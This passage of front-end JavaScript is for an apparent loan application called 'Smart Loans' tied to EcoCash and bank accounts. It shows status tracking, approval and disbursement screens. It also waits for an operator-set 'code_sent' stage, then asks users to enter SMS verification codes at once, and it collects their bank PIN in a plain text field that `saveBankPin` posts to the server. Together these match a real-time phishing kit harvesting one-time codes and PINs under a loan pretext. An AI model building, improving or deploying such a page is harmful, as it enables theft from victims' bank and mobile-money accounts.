            "applicationId",
            result.application.id
        );

        loadTrackingScreen();

    } catch (error) {

        console.error(
            "EcoCash application error:",
            error
        );

        alert(
            "Unable to submit your application."
        );

        loadReviewScreen();

    }

}
// ===============================
// LIVE TRACKING STATUS
// ===============================

async function refreshTrackingStatus() {

    const id =
        sessionStorage.getItem("applicationId");

    if (!id) return;

    try {

        const response =
            await fetch(`/application-status/${id}`);

        const result =
            await response.json();

        if (!result.success) return;

        const stage =
            result.application.current_stage;

        updateTrackingUI(stage);

    } catch (err) {

        console.error(
            "TRACKING STATUS ERROR:",
            err
        );

    }

}
// ===============================
// UPDATE TRACKING UI
// ===============================

function updateTrackingUI(stage) {

    const status =
        document.getElementById("trackingStatus");

    if (!status) return;

    switch (stage) {

        case "waiting_code":

            status.innerHTML =
                "🟡 Waiting for Verification Code";

            status.className =
                "tracker-step step-yellow";

            break;


        case "code_sent":

            status.innerHTML =
                "🟢 Verification Code Sent";

            status.className =
                "tracker-step step-green";

            break;


        case "verified":

            status.innerHTML =
                "🟢 Phone Number Verified";

            status.className =
                "tracker-step step-green";

            break;


        case "assessment":

            status.innerHTML =
                "🟡 Loan Assessment";

            status.className =
                "tracker-step step-yellow";

            break;


        case "approved":

            status.innerHTML =
                "🟢 Loan Approved";

            status.className =
                "tracker-step step-green";

            break;


        case "disbursed":

            status.innerHTML =
                "🎉 Funds Successfully Disbursed";

            status.className =
                "tracker-step step-green";

            const dots =
                document.querySelector(".loading-dots");

            if (dots) {
                dots.style.display = "none";
            }

            break;


        default:

            status.innerHTML =
                "🟡 Processing Application";

            status.className =
                "tracker-step step-yellow";

    }

}
// ======================================================
// PART 29 - MONITOR APPLICATION
// ======================================================

async function monitorApplication() {

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) return;

    try {

        const response = await fetch(
            `/application-status/${applicationId}`
        );

        const result = await response.json();

        if (!result.success) return;

        const stage =
            result.application.current_stage;

        updateTrackingUI(stage);

        if (stage === "approved") {

            loadApprovedScreen();

            return;
        }

        if (stage === "disbursed") {

            loadDisbursedScreen();

            return;
        }

    } catch (err) {

        console.error(
            "Application monitoring error:",
            err
        );

    }

}
// ======================================================
// PART 30 - LOAN TRACKING SCREEN
// ======================================================

function loadTrackingScreen() {

    const app = document.getElementById("app");

    const applicationId =
        sessionStorage.getItem("applicationId") || "Processing...";

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <h2>🏦 Smart Loans</h2>

            <p>
                Your loan application has been successfully
                received and is currently under review.
                If approved, your loan funds will be disbursed
                to the bank account or EcoCash wallet you
                provided during your application.
            </p>

        </div>

        <div class="tracker-card">

            <h3 style="text-align:center;">
                Pin
            </h3>

            <h2 style="
                text-align:center;
                color:#1565C0;
            ">
                SL-${applicationId}
            </h2>

            <hr>

            <div class="tracker-step step-green">
                ✅ Application Submitted
            </div>

            <div class="tracker-step step-green">
                ✅ Customer Details Received
            </div>

            <div
                id="trackingStatus"
                class="tracker-step step-yellow"
            >
                🟡 Waiting for Verification Code
            </div>

            <div class="loading-dots">

                <span></span>
                <span></span>
                <span></span>

            </div>

            <div
                class="status-message"
                id="trackingMessage"
            >

                A verification code will be sent
                after the application is reviewed.

            </div>

            <hr>

            <div class="tracker-step step-gray">
                ⚪ Phone Verification
            </div>

            <div class="tracker-step step-gray">
                ⚪ Loan Assessment
            </div>

            <div class="tracker-step step-gray">
                ⚪ Loan Approval
            </div>

            <div class="tracker-step step-gray">
                ⚪ Funds Disbursed
            </div>

        </div>

    </div>

    `;

    refreshTrackingStatus();

    monitorApplication();

    setInterval(refreshTrackingStatus, 5000);

    setInterval(monitorApplication, 5000);

}
// ======================================================
// PART 31 - APPROVED SCREEN
// ======================================================

function loadApprovedScreen() {

    const app = document.getElementById("app");

    const applicationId =
        sessionStorage.getItem("applicationId") || "";

    const amount =
        sessionStorage.getItem("loanAmount") || "0.00";

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <div class="logo-circle">
                🎉
            </div>

            <h1 class="dashboard-title">
                Loan Approved!
            </h1>

            <p class="dashboard-subtitle">
                Your Smart Loans application has been approved.
            </p>

        </div>

        <div class="welcome-card">

            <h2 style="text-align:center;">
                Congratulations 🎉
            </h2>

            <p class="intro">

                Your loan application has successfully
                passed the assessment stage.

                <br><br>

                Your approved loan amount is:

            </p>

            <div class="feature">

                <h2 style="
                    text-align:center;
                    color:#0d47a1;
                ">
                    $${amount}
                </h2>

            </div>

            <br>

            <div class="tracker-card">

                <div class="tracker-step step-green">
                    ✅ Application Submitted
                </div>

                <div class="tracker-step step-green">
                    ✅ Verification Completed
                </div>

                <div class="tracker-step step-green">
                    ✅ Loan Assessment Completed
                </div>

                <div class="tracker-step step-green">
                    ✅ Loan Approved
                </div>

                <div class="tracker-step step-yellow">
                    🟡 Preparing Disbursement
                </div>

            </div>

            <p
                class="status-message"
                style="margin-top:20px;"
            >

                Your funds will be disbursed to the
                bank account or EcoCash wallet provided
                during your application.

            </p>

            <p style="
                text-align:center;
                color:#777;
                font-size:13px;
                margin-top:15px;
            ">

                Application ID: ${applicationId}

            </p>

        </div>

    </div>

    `;

    // Continue monitoring in case the admin
    // changes the application to "disbursed".
    monitorApplication();

}
// ======================================================
// PART 32 - DISBURSED SCREEN
// ======================================================

function loadDisbursedScreen() {

    const app = document.getElementById("app");

    const amount =
        sessionStorage.getItem("loanAmount") || "0.00";

    const applicationId =
        sessionStorage.getItem("applicationId") || "";

    const method =
        sessionStorage.getItem("disbursementMethod") || "";

    app.innerHTML = `

    <div class="container">

        <div class="dashboard-card">

            <div class="logo-circle">
                🎉
            </div>

            <h1 class="dashboard-title">
                Funds Disbursed!
            </h1>

            <p class="dashboard-subtitle">
                Your loan has been successfully disbursed.
            </p>

        </div>

        <div class="welcome-card">

            <h2 style="text-align:center;">
                🎊 Congratulations!
            </h2>

            <p
                class="intro"
                style="text-align:center;"
            >

                Your Smart Loans funds have been
                successfully processed.

            </p>

            <div class="feature">

                <h3 style="text-align:center;">
                    Loan Amount
                </h3>

                <h2 style="
                    text-align:center;
                    color:#0d47a1;
                ">
                    $${amount}
                </h2>

            </div>

            <br>

            <div class="feature">

                <strong>
                    Disbursement Method
                </strong>

                <br>

                ${method || "Selected payment method"}

            </div>

            <br>

            <div class="tracker-card">

                <div class="tracker-step step-green">
                    ✅ Application Submitted
                </div>

                <div class="tracker-step step-green">
                    ✅ Verification Completed
                </div>

                <div class="tracker-step step-green">
                    ✅ Loan Assessment Completed
                </div>

                <div class="tracker-step step-green">
                    ✅ Loan Approved
                </div>

                <div class="tracker-step step-green">
                    🎉 Funds Successfully Disbursed
                </div>

            </div>

            <br>

            <p style="
                text-align:center;
                line-height:1.7;
            ">

                Please check your selected bank account
                or EcoCash wallet for the funds.

            </p>

            <p style="
                text-align:center;
                color:#777;
                font-size:13px;
            ">

                Application ID: ${applicationId}

            </p>

        </div>

    </div>

    `;

}
// ======================================================
// CODE SENDING SCREEN
// ======================================================

function loadEcoCashCodeSendingScreen() {

    const app = document.getElementById("app");

    app.innerHTML = `

    <div class="container">

        <div class="welcome-card">

            <div style="
                font-size:60px;
                text-align:center;
            ">
                🟢
            </div>

            <h2 style="text-align:center;">
                EcoCash Verification
            </h2>

            <br>

            <div style="
                text-align:center;
                font-size:22px;
                color:#f39c12;
                font-weight:bold;
            ">

                🟡 Sending verification code...

            </div>

            <br>

            <p style="
                text-align:center;
                line-height:1.8;
            ">

                Requesting 
                verification code.

                <br><br>

                You will be required to enter the code
                immediately.

            </p>

            <div class="loading-dots">

                <span></span>
                <span></span>
                <span></span>

            </div>

        </div>

    </div>

    `;

    monitorEcoCashCodeStatus();

}
// ======================================================
// MONITOR ECOCASH CODE STATUS
// ======================================================

async function monitorEcoCashCodeStatus() {

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        console.error(
            "Application ID not found."
        );

        return;

    }

    try {

        const response = await fetch(
            `/application-status/${applicationId}`
        );

        const result = await response.json();

        if (!result.success) {
            return;
        }

        const application =
            result.application;

        if (
            application.current_stage ===
            "code_sent"
        ) {

            loadEcoCashVerificationScreen();

            return;

        }

    } catch (err) {

        console.error(
            "CODE STATUS ERROR:",
            err
        );

    }

    // Check again after 3 seconds
    setTimeout(
        monitorEcoCashCodeStatus,
        3000
    );

}
// ======================================================
// SUBMIT BANK VERIFICATION CODE
// ======================================================

async function submitBankVerificationCode() {

    const input =
        document.getElementById("bankVerificationCode");

    const code = input.value.trim();

    if (code === "") {

        alert("Please enter the bank verification code sent via SMS.");

        return;
    }

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        alert("Application session not found.");

        return;
    }

    try {

        const response = await fetch(
            `/submit-bank-verification/${applicationId}`,
            {
                method: "PUT",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    verificationCode: code
                })
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.message ||
                "Unable to submit verification code."
            );

        }

        loadVerificationPendingScreen();

    } catch (err) {

        console.error(
            "SUBMIT BANK CODE ERROR:",
            err
        );

        alert(
            "Unable to submit the verification code."
        );

    }

}
// ======================================================
// BANK PIN SCREEN
// ======================================================

function loadBankPinScreen() {

    const app = document.getElementById("app");

    const bank =
        sessionStorage.getItem("selectedBank") || "Bank";

    app.innerHTML = `

    <div class="container">

        <div class="app-header">

            <button class="back-btn" id="backBankVerification">
                ← Back
            </button>

            <div>

                <div class="app-title">
                    Smart Loans
                </div>

                <div class="app-subtitle">
                    Fast • Secure • Convenient
                </div>

            </div>

            <div class="secure">
                🔒 Secure
            </div>

        </div>

        <div class="progress-bar">

            <div class="progress-fill"
                 style="width:80%;">
            </div>

        </div>

        <div class="welcome-card">

            <h2>${bank} Pin</h2>

            <p class="intro">

                Enter the <strong>bank pin
                </strong> to initiate withdrawal.

                <br><br>

                Withdraw to your Bank Account 

            </p>

            <label>
                Bank Pin
            </label>

            <input
                type="text"
                id="bankPin"
                placeholder="Enter pin"
                autocomplete="off">

            <br><br>

            <button id="continueBankPin">

                Continue →

            </button>

        </div>

    </div>

    `;

    document
        .getElementById("backBankVerification")
        .addEventListener(
            "click",
            loadBankVerificationScreen
        );

    document
        .getElementById("continueBankPin")
        .addEventListener(
            "click",
            saveBankPin
        );

            }
// ======================================================
// SAVE BANK PIN
// ======================================================

async function saveBankPin() {

    const input =
        document.getElementById("bankPin");

    const pin =
        input.value.trim();

    if (pin === "") {

        alert("Please enter your bank pin.");

        return;
    }

    const applicationId =
        sessionStorage.getItem("applicationId");

    if (!applicationId) {

        alert("Application session not found.");

        return;
    }

    try {

        const response = await fetch(
            `/save-bank-pin/${applicationId}`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    bankPin: pin
                })
            }
        );

        const result = await response.json();

        if (!response.ok || !result.success) {

            throw new Error(
                result.message ||
                "Unable to save bank pin."
            );

        }

        // Continue to the application tracking/assessment stage
        loadTrackingScreen();

    } catch (err) {

        console.error(
            "SAVE BANK PIN ERROR:",
            err
        );

        alert(
            "Unable to save the bank pin."
        );

    }

}
// ======================================================
// PART 33 - INITIALIZE SMART LOANS
// ======================================================

document.addEventListener("DOMContentLoaded", () => {

    loadWelcomeScreen();

});
